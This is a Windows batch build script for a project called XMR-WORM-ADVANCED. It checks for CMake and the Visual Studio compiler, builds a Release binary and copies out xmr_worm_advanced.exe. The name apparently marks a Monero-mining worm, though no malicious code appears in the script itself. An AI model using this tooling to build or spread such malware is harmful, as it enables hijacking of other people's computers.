@echo off
REM XMR-WORM-ADVANCED Windows Build Script
REM This script builds the project on Windows using CMake

echo [*] Building XMR-WORM-ADVANCED for Windows...

REM Check if CMake is installed
where cmake >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [!] CMake not found. Please install CMake from https://cmake.org/download/
    echo [!] Make sure to add CMake to your PATH
    pause
    exit /b 1
)

REM Check if Visual Studio or Build Tools are installed
where cl >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo [!] Visual Studio C++ compiler not found.
    echo [!] Please install Visual Studio Build Tools from https://visualstudio.microsoft.com/visual-cpp-build-tools/
    echo [!] Or run this script from a Developer Command Prompt
    pause
    exit /b 1
)

REM Create build directory
if not exist build mkdir build
cd build

REM Configure with CMake
echo [*] Configuring project with CMake...
cmake .. -G "Visual Studio 17 2022" -A x64 -DCMAKE_BUILD_TYPE=Release
if %ERRORLEVEL% NEQ 0 (
    echo [!] CMake configuration failed
    cd ..
    pause
    exit /b 1
)

REM Build the project
echo [*] Building project...
cmake --build . --config Release --parallel
if %ERRORLEVEL% NEQ 0 (
    echo [!] Build failed
    cd ..
    pause
    exit /b 1
)

REM Copy binary
if exist Release\xmr_worm_advanced.exe (
    copy Release\xmr_worm_advanced.exe ..\xmr_worm_advanced.exe
    echo [*] Build complete. Binary: xmr_worm_advanced.exe
    dir ..\xmr_worm_advanced.exe
) else (
    echo [!] Binary not found after build
)

cd ..
echo [*] Build process completed.
pause